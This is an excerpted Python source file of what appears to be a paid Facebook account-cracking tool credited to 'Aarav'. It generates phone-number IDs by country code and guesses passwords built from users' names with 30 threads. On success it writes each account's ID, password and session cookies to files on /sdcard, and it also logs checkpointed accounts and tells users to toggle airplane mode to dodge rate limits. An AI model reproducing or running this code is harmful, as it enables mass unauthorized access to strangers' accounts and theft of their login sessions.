# SOURCE BY : Aaravxwd
# Facebook : https://www.facebook.com/profile.php?id=100093212952724&mibextid=ZbWKwL
#watsapp :https://chat.whatsapp.com/DN5gBJnafyZAceDOQWrx4E
from os import path
...
def cek_apk(coki):
	...
	try:
		...
		print ("\r      ® cookie invalid"%(M))


def p(x):
	print(x)
os.system(f'xdg-open https://chat.whatsapp.com/GTf6GbYWFPp5rM6NF8qcZv')
...
\033[1;37m [®] \033[1;37mOwner     :   AARAV    
 [®] Facebook  :  KI RA                      
 [®] Github    :   Aarav-9      
 [®] Tool      :   PAID
 [®] What's up :   +977982*****07      
 [®] Version   :  1.0
\033[1;37m_______________________________________""")
def linex():
        print('\033[1;37m_____________________________')
def clear():
        os.system('clear')
        print(logo)
loop=0
...
def menu():
                        ...
                        if xd in ['1','01']:
                                ...
                                if psx in ['1','01']:
                                        ...
                                        plist.append('@first1234')
                                        plist.append('first@@@')
                                        plist.append('firstlast321@')
                                        plist.append('lastfirst321@')
                                        plist.append('first321@')
                                        ...
                                        try:
                                                ...
                                                ps_limit =1
                                        linex()
                                        print('\033[1;32m exp: first last,firstlast,first123 first1234')
                                        linex()
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print("\033[1;37m \x1b[38;5;208mUSE AIRPLANE MODE FOR MORE OK COOKIES..\033[1;37m")
                                        linex()
                                        for user in fo:
                                ...
                                os.system(f'https://chat.whatsapp.com/DN5gBJnafyZAceDOQWrx4E/{wx}');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use ......')
                        else:
...
def npxind():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as Nischal:     
                        clear()
                        id = str(len(user))
                        ...
                        for psx in user:
                                ...
                                if mthd in ['1','01']:                                 
                                    Nischal.submit(rndm1,ids,passlist)
                                if mthd in ['2','02']:    
                                    Nischal.submit(rndm,ids,passlist)                                	
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def pak():
                ...
                print(" Put your country 4digit code")
                linex
                code = input('\033[1;37m put your Country code: ')
                try:
                        limit = int(input('\033[1;37m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as Aarav:     
                        clear()
                        id = str(len(user))
                        print('Total account : \033[1;32m'+id)
                        print('The process is running in the background ')
                        ...
                        for psx in user:
                                ...
                                if mthd in ['1','01']:                                 
                                    Aarav.submit(rndm1,ids,passlist)
                                if mthd in ['2','02']:    
                                    Aarav.submit(rndm,ids,passlist)                                	
                print('\033[1;37m')
                linex()
...
def gmail():
                ...
                with tred(max_workers=30) as Aarav:
                        ...
                        print("\033[1;37m \x1b[38;5;208mUse Aeroplane mode for More Cookies..\033[1;37m")
                        linex()
                        for user in fo:
                                ids,names = user.split('|')
...
def M1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [Aarav-M1] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [Aarav-OK] '+ids+' | '+pas+'\033[1;97m')                 
                                       # print("\033[1;33m [BISCUT-ðŸª] :\033[1;33m "+cookie)                                                   
                                        open('/sdcard/Aarav_m1_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/Aarav_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                      
                                        oks.append(ids)                           
                                        break                          
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [Nischal-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/Aarav-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/Aaravbrand-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
...
def M2(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [Aarav-M2] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m [Aarav-OK] '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m') 
                                        print("\033[1;96m [BISCUT-ðŸª] :\033[1;37m "+cookie)           
                                        open('/sdcard/Aarav_m2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/Aarav_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                                        
                                        oks.append(ids)                                        
                                        break
                                                                                  
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [Aarav-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/Aarav-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)                                                 
                                                break
                                        else:
...
def M3(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [Aarav-M3] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m [Aarav-OK] '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m')            
                                        open('/sdcard/Aarav_m3_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/Aarav_iDs_COOKiE_M3.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                                        
                                        oks.append(ids)                                        
                                        break
...
def M4(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [Aarav-M4] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
...
'Content-Length': '706'}
                                ...
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m [Aarav-OK] '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m')            
                                        open('/sdcard/Aarav_m4_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/Aarav_iDs_COOKiE_M4.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                                       
                                        oks.append(ids)              
                                        break                                                                         
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
...
def rndm1(ids,passlist):
        global loop
        global oks,cps
        sys.stdout.write('\r\r\033[1;32m [Aarav-M1] %s|OK-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [Aarav-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        ...
                                        open('/sdcard/Aarav_R_COOKiE_M1.txt','a').write(str(uid)+'|'+pas+'|'+cookie+'\n')                                     
                                        open('/sdcard/Aarav-R-M1-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [Aarav-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Aarav-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
'X-Fb-Server-Cluster': 'True',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [Aarav-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"  
                                        open('/sdcard/Aarav_R_COOKiE_M2.txt','a').write(str(uid)+'|'+pas+'|'+cookie+'\n')                                     
                                        open('/sdcard/Aarav-R-M2-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
